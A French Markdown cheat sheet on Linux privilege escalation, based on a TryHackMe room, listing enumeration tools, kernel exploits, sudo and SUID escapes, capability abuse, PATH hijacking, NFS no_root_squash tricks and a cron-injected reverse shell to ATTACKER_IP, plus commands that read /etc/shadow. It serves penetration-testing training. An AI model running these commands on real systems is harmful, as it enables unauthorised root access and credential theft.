# 🧗‍♂️ Linux Privilege Escalation Cheat Sheet

Basée sur le parcours [TryHackMe - Linux Privilege Escalation](https://tryhackme.com/room/linprivesc), cette cheat sheet décrit les principales méthodes d’**élévation de privilèges sur Linux**, avec une **explication claire** pour chaque type d’exploitation.

---

## 🧭 1. Énumération initiale

> 🎯 **But :** Collecter un maximum d’infos sur le système, l’utilisateur et l’environnement pour identifier des failles potentielles.

```bash
hostname
uname -a
cat /etc/issue
python --version
id
```

---

## 🧰 2. Outils d'automatisation

> 🎯 **But :** Gagner du temps dans la détection des configurations faibles ou vulnérables.

### LinPEAS

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### LinEnum

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Linux Exploit Suggester

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

## 🧨 3. Exploits du noyau Linux

> 🎯 **But :** Exploiter des failles connues du noyau Linux (ex : Dirty Cow) pour obtenir un shell root.

```bash
uname -r
searchsploit 3.13.0
```

Compiler et exécuter un exploit local :

```bash
gcc exploit.c -o exploit
./exploit
```

---

## 🔐 4. Sudo & GTFOBins

> 🎯 **But :** Utiliser les permissions `sudo` accordées à l'utilisateur pour exécuter des commandes en tant que root sans mot de passe.

```bash
sudo -l
```

Exemples de contournement :

```bash
sudo find . -exec /bin/sh \; -quit
sudo nmap --interactive  # puis !sh
sudo less /etc/shadow
```

Consulter : https://gtfobins.github.io/

---

## 🧱 5. Fichiers SUID

> 🎯 **But :** Exploiter des binaires exécutés avec les privilèges de leur propriétaire (souvent root).

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Utiliser un binaire SUID comme escalade :

```bash
./base64 /etc/shadow | base64 --decode
```

---

## 🧩 6. Capabilities

> 🎯 **But :** Exploiter des fichiers ayant des capacités spéciales (ex : `cap_setuid` pour exécuter en tant que root).

```bash
getcap -r / 2>/dev/null
```

Exemple :

```bash
./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## 🕒 7. Cron Jobs

> 🎯 **But :** Modifier un script ou binaire exécuté régulièrement par `cron` en tant que root.

```bash
cat /etc/crontab
```

Insérer un shell inversé :

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /path/to/script.sh
```

---

## 🧬 8. Variables d'environnement & PATH

> 🎯 **But :** Détourner une commande appelée sans chemin absolu dans un script root en manipulant la variable `$PATH`.

```bash
echo "cat /home/user/flag.txt" > /home/user/fakecmd
chmod +x /home/user/fakecmd
export PATH=/home/user:$PATH
```

---

## 📂 9. NFS & no_root_squash

> 🎯 **But :** Utiliser un partage NFS mal configuré (avec `no_root_squash`) pour exécuter un fichier en tant que root.

```bash
cat /etc/exports
mount -o rw target:/share /mnt
```

Compiler un SUID shell :

```c
echo '#include <stdlib.h>\nint main() { setuid(0); system("/bin/bash"); return 0; }' > shell.c
gcc shell.c -o shell
chmod +s shell
```

---

## 🧠 10. Conseils pratiques

- Utilise `searchsploit` pour chaque version du noyau
- Consulte GTFOBins pour chaque commande que tu peux utiliser
- Essaie `linpeas.sh` systématiquement : ça détecte tout en quelques minutes

---

📁 À ajouter dans `docs/cours/privilege-escalation/linux.md` ou `cheatsheets/privesc-linux.md`
